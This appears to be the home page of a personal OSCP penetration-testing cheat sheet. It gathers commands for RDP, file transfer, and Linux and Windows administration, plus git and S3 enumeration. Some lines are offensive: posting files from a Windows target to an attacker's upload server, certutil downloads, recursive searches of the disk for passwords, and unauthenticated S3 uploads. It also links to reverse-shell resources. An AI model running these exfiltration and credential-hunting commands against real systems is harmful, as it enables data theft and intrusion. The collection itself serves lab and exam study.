# 🦩 Home

<div align="center">
    <img src=assets/main.png>
</div>

## Quick Links

!!! info ""
    [📜 Writeups](https://krovs.github.io/oscp-writeups) 🔸 [Hacktricks](https://book.hacktricks.xyz/) 🔸 [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/) 🔸 [GTFOBins](https://gtfobins.github.io/) 🔸 [RevShells](https://revshells.com)

## Connecting to RDP

```shell
# add resolution support
xfreerdp3 /u:user /p:pass /v:<ip> /dynamic-resolution
# add clipboard support
xfreerdp3 /u:user /p:pass /v:<ip> +clipboard
# add a share to easily transfer files
xfreerdp3 /u:user /p:pass /v:<ip> /drive:<name>,<path>
```

## File Transfers

!!! tip
    Beware of reflected ports!

### HTTP Server

```shell
# simple python server
python -m http.server <port>
# raven upload service
raven 0.0.0.0 443

# WebDAV server
wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r .

# Apache (copy files to /var/www/html)
sudo systemctl start apache2
```

### SMB Server

```shell
impacket-smbserver -smb2support share $(pwd) 
# Windows 10+ compatibility (with authentication)
impacket-smbserver -smb2support -user test -password test share $(pwd) 
```

### Netcat

```shell
# start a listener (nc|nc.exe)
nc -lvnp <port> > received_file

# send the file
nc <ip> <port> < <file_path>
```

### Downloading files

=== "Windows"

    ```shell
    # PowerShell
    iwr -uri <uri> -outfile <filename>

    # CMD
    certutil -urlcache -split -f <uri> <dest>

    # copy from SMB share
    copy \\<ip>\share\<file>

    # mount share before copy (Win 10+ without authentication)
    net use Z: \\<ip>\share
    # mount share before copy (Win 10+ with authentication)
    net use Z: \\<ip>\share /u:user 'pass'
    ```

=== "Linux"

    ```shell
    # wget and curl
    wget http://<ip>:<port>/<file>
    curl -O http://<ip>:<port>/<file>
    ```

### Exfiltrating files from Windows

```shell
# send file to Python upload-enabled server
Invoke-WebRequest -Uri http://<linux-ip>:<port>/upload -Method Post -InFile C:\path\to\file
curl -F "file=@C:\path\to\file.txt" http://<linux-ip>:<port> -u user:pass

# copy to SMB share
copy C:\path\to\file \\<ip>\share

# mount share before copy (Win 10+ without authentication)
net use Z: \\<ip>\share
# mount share before copy (Win 10+ with authentication)
net use Z: \\<ip>\share /u:user 'pass'
```

## SSH

```shell
# create keys
ssh-keygen -t rsa -b 4096

# transfer data to
scp <file> <user>@<ip>:<path>
# transfer data from
scp <user>@<ip>:<path> <file>
# use legacy SCP protocol instead of SFTP
scp -O <file> <user>@<ip>:<path>
```

## Misc

```shell
# reduce binary size (useful for binaries that are going to be transferred)
upx <bin_path>

# find printable strings in a file
strings

# extract files from a binary
binwalk <bin_path>
binwalk -e <bin_path>


# display dynamic library calls of a process, perfect for binary hijacking
ltrace
```

## OS Commands

### System Information

=== "Linux"

    ```shell
    # kernel info
    uname -a
    # distro info
    lsb_release -a
    ```

=== "Windows"

    ```shell
    # system info
    systeminfo
    Get-ComputerInfo
    # OS details
    wmic os get version
    Get-WmiObject Win32_OperatingSystem
    # show drives
    Get-PSDrive
    # show tasks
    schtasks
    Get-ScheduledTask
    # recent system events
    Get-EventLog -LogName System -Newest 10
    # path permissions
    icacls "<path>"
    Get-ACL "<path>"
    ```

### User Management

=== "Linux"

    ```shell
    # show user info
    id <username>
    whoami
    groups <username>
    # switch to user
    su - <username>
    sudo su - <username>
    # switch to root
    su -
    sudo su -
    # check user sudo permissions
    sudo -l

    # create/delete/change user password
    useradd -m username
    useradd -u <UID> -g <group> <uname>
    userdel -r username
    passwd username
    # add to group
    usermod -aG sudo username

    # show who is currently logged in
    who | w
    # show last logins
    last
    ```

=== "Windows"

    ```shell
    # show current user
    whoami /all
    # list all users
    net user
    Get-LocalUser
    # show user details
    net user username
    # create/delete/change user password
    net user username password /add
    New-LocalUser -Name "username" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)
    net user username /delete
    net user username newpassword
    # list all groups
    net localgroup
    Get-LocalGroup
    # show members
    net localgroup groupname
    Get-LocalGroupMember "Administrators"
    # add/delete user to group
    net localgroup groupname username /add
    Add-LocalGroupMember -Group "Administrators" -Member "username"
    net localgroup groupname username /delete
    net localgroup Administrators username /add

    # run command as a different user
    runas /user:domain\username cmd
    ```

### File Operations

=== "Linux"

    ```shell
    find / -name filename 2>/dev/null
    # find text in files
    grep -r "text" /path 2>/dev/null

    # compress/extract files
    tar -czvf archive.tar.gz /path
    tar -xzvf archive.tar.gz

    # find a program
    which <program>
    whereis <program>
    locate <program>
    ```

=== "Windows"

    ```shell
    dir /s filename 2>nul
    Get-ChildItem -Recurse -Filter *.txt -ErrorAction SilentlyContinue
    # find text in files
    findstr /s "text" * 2>nul
    Select-String -Path *.txt -Pattern "text" -ErrorAction SilentlyContinue
    # search for a string in all files
    Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue
    # search for a string in specific files
    Get-ChildItem -Path C:\ -Recurse -File -Force -Include "*.txt","*.config","*.json" -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue

    # find a program
    where /R <path> <program.exe>
    Get-ChildItem -Path C:\ -Filter <program.exe> -Recurse -ErrorAction SilentlyContinue

    # copy directories recursively
    xcopy /s /e source destination /Y 2>nul
    Copy-Item -Recurse source destination -Force
    # move
    move source destination
    # delete
    del filename /Q
    Remove-Item -Recurse -Force path
    ```

### Process Management

=== "Linux"

    ```shell
    ps aux
    ps auxww
    kill <pid>
    # force
    kill -9 <pid>
    killall <process_name>
    # find process PID by name
    pgrep process_name
    ```

=== "Windows"

    ```shell
    tasklist
    wmic process list full
    # find specific
    tasklist | findstr <program.exe>

    # force kill process by name
    taskkill /F /IM <program.exe>
    # by ID
    taskkill /PID <pid_number> /F

    Get-Process
    # force kill process by ID
    Stop-Process -Id PID -Force
    Stop-Process -Name "process" -Force
    ```

### Networking

=== "Linux"

    ```shell
    # show interfaces
    ip a
    ifconfig
    # list listening connections
    ss -ntplu
    netstat -ntplu
    # show processes listening on a port
    lsof :i<port>
    # test connectivity
    ping host
    # trace path
    traceroute host
    # DNS lookup
    dig domain
    nslookup domain
    # kill connection
    fuser -k <port>/tcp
    fuser -k <port>/udp
    # routing table
    ip route show
    # log incoming traffic on a specific port
    sudo tcpdump -nvvvXi tun0 tcp port 8080
    ```

=== "Windows"

    ```shell
    # show network config
    ipconfig /all
    # connections and listening ports
    netstat -ano
    # show ip addresses
    Get-NetIPAddress
    # show tcp connections
    Get-NetTCPConnection
    # dns lookup
    nslookup domain
    Resolve-DnsName domain
    # trace route
    tracert host
    # test connectivity
    Test-NetConnection host -Port port
    # routing table
    route print
    ```

### Service Management

=== "Linux"

    ```shell
    # systemd distros
    systemctl status service_name
    systemctl start|stop|restart service_name
    # enable service to start at boot
    systemctl enable|disable service_name

    # no systemd
    service service_name status
    service service_name start|stop|restart

    # other
    ls /etc/init.d/
    /etc/init.d/service_name start|stop|restart
    ```

=== "Windows"

    ```shell
    sc query service_name
    Get-Service service_name

    sc start|stop service_name
    net start|stop service_name
    Start-Service service_name
    Stop-Service service_name
    Restart-Service service_name

    # set service to start automatically
    sc config service_name start=auto
    Set-Service service_name -StartupType Automatic
    Set-Service service_name -StartupType Disabled
    # disable service
    sc config service_name start=disabled

    # list all running services
    Get-Service | Where-Object {$_.Status -eq "Running"}
    ```

### System Control

=== "Linux"

    ```shell
    sudo reboot
    sudo shutdown -r now
    # shutdown
    sudo shutdown -h now
    # traditional restart
    sudo init 6
    ```

=== "Windows"

    ```shell
    # restart and shutdown
    shutdown /r /t 0
    shutdown /s /t 0

    Restart-Computer -Force
    Stop-Computer
    ```

### Error Suppression

=== "Linux"

    - Append `2>/dev/null` to suppress error messages only.
    - Append `&>/dev/null` to suppress both standard output and errors.
  
=== "Windows"

    - **CMD**: Append `2>nul` to suppress error messages.
    - **PowerShell**: Add the `-ErrorAction SilentlyContinue` parameter to cmdlets.

## Git

> [git-dumper](https://github.com/arthaud/git-dumper)

```shell
# dump git repo from URL
git-dumper <url>/.git ./website

# show commits on a branch
git log
# show commit details and changes
git show <commit>
```

## AWS

!!! warning ""
    Out of Scope

Set up credentials if you find access keys.

```shell
aws configure
```

### S3

```shell
# list public buckets without credentials
aws s3 ls s3://<bucket>/ --endpoint-url <url> --no-sign-request

# download a bucket
aws s3 cp s3://<bucket> ./

# check bucket policy
aws s3api get-bucket-policy --bucket <bucket> --endpoint-url <url> --no-sign-request

# upload a file to a bucket
aws s3 cp <file> s3://<bucket>/ --endpoint-url <url> --no-sign-request
```

## VPN

!!! danger
    OffSec machines and VPN are sometimes unstable.

Reduce MTU if reverse shells are not connecting back.

```shell
ifconfig tun0 mtu 1200
```
